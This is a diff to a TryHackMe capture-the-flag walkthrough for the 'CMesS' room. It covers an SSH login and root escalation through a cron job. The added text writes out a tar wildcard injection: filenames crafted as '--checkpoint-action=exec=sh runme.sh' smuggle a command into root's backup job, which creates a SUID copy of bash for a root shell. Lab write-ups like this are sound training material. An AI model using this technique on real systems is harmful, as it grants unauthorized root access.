@@ -88,8 +88,36 @@ We know that port 22 is open which is SSH so let's try to ssh into the machine w
 ```bash
 ssh andres@cmess.thm
 ```
-![SSH into]
+![SSH into](CMesS-SSH-Into.png)
 
 It worked and we can also see ```user.txt``` file which has the user flag. Last task remaining is to become root. I am again running LinEnum to see if I can find anything interesting that can be used to escalate privileges.
 
 ![LinEnum-Crontab](CMesS-LinEnum-Crontab.png)
+
+![LinEnum-Sudo-Version](CMesS-Sudo-Version.png)
+
+![LinEnum-SUID-Files](CMesS-SUID-Files.png)
+
+I tried sudo version exploit and other SUID files and nothing worked for me. The last thing left is to use cron jobs to get a root shell. If we look at the last cron job, we see that it is run by root. It goes into ```/home/andre/backup``` and creates a backup file in ```/tmp```. Here is the script to escalate our privilege via the last cron job:
+```bash
+echo ‘cp /bin/bash /tmp/bash; chmod +s /tmp/bash’ > runme.sh  --> this generates runme.sh file which copies /bin/bash to /tmp
+touch /home/andre/--checkpoint=1 
+touch /home/andre/--checkpoint-action=exec=sh\ runme.sh
+```
+After that we wait for about one minute and then check ```/tmp``` folder to see if bash has been copied:
+
+![Bash](CMesS-bash.png)
+
+Now, we can run the bash file with ```/tmp/bash -p```
+
+1[Root](CMesS-Root.png)
+
+Woww, we have done it, we can grab the root file which has the root flag.
+
+I hope you enjoyed this walkthrough.
+
+[<= Go Back to TryHackMe Walkthrouhgs](TryHackMeWalkthroughs.md)
+
+[<= Go Back to Main Menu](index.md)
+
+
